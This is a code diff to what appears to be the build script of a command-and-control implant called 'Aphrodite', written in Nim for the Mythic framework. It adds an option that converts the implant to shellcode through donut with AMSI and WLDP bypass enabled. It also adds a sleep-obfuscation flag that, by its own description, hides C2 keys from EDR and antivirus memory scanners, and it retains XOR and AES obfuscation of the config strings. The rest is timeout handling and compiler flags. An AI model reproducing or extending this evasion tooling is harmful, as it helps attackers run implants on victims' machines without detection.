@@ -2,6 +2,7 @@ import base64
 import json
 import os
 import shutil
+import signal
 import subprocess
 import tempfile
 from pathlib import Path
@@ -65,6 +66,25 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
             description="String obfuscation: xor (XOR-encode config strings) or aes (AES-128-CBC-encode config strings). Works on all targets.",
             choices=["none", "xor", "aes"],
             default_value="none",
+            required=False,
+        ),
+        BuildParameter(
+            name="output_format",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Output format: exe (standard PE binary) or shellcode (position-independent shellcode via donut, Windows only). Use shellcode when wrapping with Hephaestus.",
+            choices=["exe", "shellcode"],
+            default_value="exe",
+            required=False,
+        ),
+        BuildParameter(
+            name="sleep_obf",
+            parameter_type=BuildParameterType.Boolean,
+            description=(
+                "Sleep obfuscation (Windows only): XOR-encrypt AES key and callback ID "
+                "in memory during each sleep interval. Hides C2 crypto material from "
+                "userland memory scanners (Elastic EDR, AV) between beacons."
+            ),
+            default_value=False,
             required=False,
         ),
     ]
@@ -239,9 +259,19 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
             architecture = self.get_parameter("architecture") or "amd64"
             debug = self.get_parameter("debug") or False
             obfuscation = self.get_parameter("obfuscation") or "none"
+            output_format = self.get_parameter("output_format") or "exe"
+            sleep_obf = self.get_parameter("sleep_obf") or False
+
+            if output_format == "shellcode" and target_os != "windows":
+                build_stderr += "ERROR: shellcode output format is only supported for Windows targets.\n"
+                return BuildResponse(
+                    status=BuildStatus.Error,
+                    build_stdout=build_stdout,
+                    build_stderr=build_stderr,
+                )
 
             build_stdout += f"[+] Step 1: Gathering files...\n"
-            build_stdout += f"[*] Target: {target_os}/{architecture} | debug={debug} | obfuscation={obfuscation}\n"
+            build_stdout += f"[*] Target: {target_os}/{architecture} | debug={debug} | obfuscation={obfuscation} | output={output_format}\n"
             if profile_name == "websocket":
                 build_stdout += f"[*] C2 (WS): ws://{ws_host}:{ws_port}/{ws_endpoint} | interval={interval}s jitter={jitter}%\n"
             elif profile_name == "chesscom":
@@ -316,19 +346,18 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
 
                 nim_flags = [
                     "nim", "c",
-                    "--opt:size",
                     "--verbosity:0",
                     "--hints:off",
                     "--warnings:off",
                     "--threads:on",
+                    "--parallelBuild:1",   # one GCC at a time — avoids RAM spike on constrained VMs
                     f"--path:{os.path.join(dst_dir, 'src')}",
                 ]
 
                 if debug:
-                    nim_flags.append("-d:debug")
+                    nim_flags += ["--opt:none", "-d:debug"]
                 else:
-                    nim_flags.append("-d:release")
-                    nim_flags.append("-d:strip")
+                    nim_flags += ["--opt:none", "-d:release", "-d:strip"]
 
                 # C2 profile selection
                 if profile_name == "websocket":
@@ -357,6 +386,10 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
                 if obfuscation != "none":
                     build_stdout += f"[*] String obfuscation enabled: {obfuscation.upper()}\n"
 
+                if sleep_obf and target_os == "windows":
+                    nim_flags.append("-d:sleepObf")
+                    build_stdout += "[*] Sleep obfuscation enabled (AES key + callback ID XOR'd during sleep)\n"
+
                 # --- OS-specific compilation flags ---
                 if target_os == "windows":
                     nim_flags += [
@@ -379,22 +412,44 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
 
                 build_stdout += f"[*] nim command: {' '.join(nim_flags)}\n"
 
-                result = subprocess.run(
+                # Use Popen + start_new_session so we can kill the entire process
+                # group (nim + cc1 + ld + as) on timeout.  subprocess.run() with
+                # capture_output=True hangs forever when grandchildren keep the
+                # pipes open after the parent is killed.
+                nim_proc = subprocess.Popen(
                     nim_flags,
-                    capture_output=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
                     text=True,
-                    timeout=300,
                     cwd=dst_dir,
                     env=nim_env,
+                    start_new_session=True,
                 )
+                try:
+                    nim_stdout, nim_stderr = nim_proc.communicate(timeout=600)
+                except subprocess.TimeoutExpired:
+                    try:
+                        os.killpg(os.getpgid(nim_proc.pid), signal.SIGKILL)
+                    except ProcessLookupError:
+                        pass
+                    try:
+                        nim_stdout, nim_stderr = nim_proc.communicate(timeout=10)
+                    except Exception:
+                        nim_stdout, nim_stderr = "", ""
+                    build_stderr += "Nim compilation timed out after 600 seconds.\n"
+                    return BuildResponse(
+                        status=BuildStatus.Error,
+                        build_stdout=build_stdout,
+                        build_stderr=build_stderr,
+                    )
 
-                if result.stdout:
-                    build_stdout += result.stdout
-                if result.stderr:
-                    build_stderr += result.stderr
+                if nim_stdout:
+                    build_stdout += nim_stdout
+                if nim_stderr:
+                    build_stderr += nim_stderr
 
-                if result.returncode != 0:
-                    build_stderr += f"Nim compilation failed (exit code {result.returncode})\n"
+                if nim_proc.returncode != 0:
+                    build_stderr += f"Nim compilation failed (exit code {nim_proc.returncode})\n"
                     return BuildResponse(
                         status=BuildStatus.Error,
                         build_stdout=build_stdout,
@@ -410,6 +465,35 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
                     )
 
                 build_stdout += f"[+] Step 4: Finalizing...\n"
+
+                if output_format == "shellcode":
+                    build_stdout += "[*] Converting PE to shellcode via donut...\n"
+                    try:
+                        import donut
+                        shellcode = donut.create(
+                            file=out_binary,
+                            arch=2,      # x64
+                            bypass=3,    # bypass AMSI + WLDP
+                            compress=1,  # aPLib compression
+                            thread=1,    # run in new thread (don't block loader)
+                            exit_opt=1,  # ExitThread (don't kill host process)
+                        )
+                    except Exception as e:
+                        build_stderr += f"donut conversion failed: {e}\n"
+                        return BuildResponse(
+                            status=BuildStatus.Error,
+                            build_stdout=build_stdout,
+                            build_stderr=build_stderr,
+                        )
+                    build_stdout += f"[+] Shellcode size: {len(shellcode):,} bytes\n"
+                    build_stdout += f"[+] Aphrodite shellcode build completed successfully.\n"
+                    return BuildResponse(
+                        status=BuildStatus.Success,
+                        payload=shellcode,
+                        build_message="Aphrodite shellcode build successful (donut)",
+                        build_stdout=build_stdout,
+                        build_stderr=build_stderr,
+                    )
 
                 with open(out_binary, "rb") as f:
                     binary_data = f.read()
